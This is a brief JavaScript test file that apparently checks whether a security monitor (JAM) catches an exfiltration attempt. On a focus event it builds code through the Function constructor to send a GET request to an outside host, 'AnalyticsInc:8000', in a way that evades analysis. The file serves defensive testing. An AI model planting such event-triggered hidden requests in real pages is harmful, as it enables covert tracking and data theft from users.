// exfil_test_onfocus2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onfocus2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("focus", JAM.call(Function, null, [exp]), false)
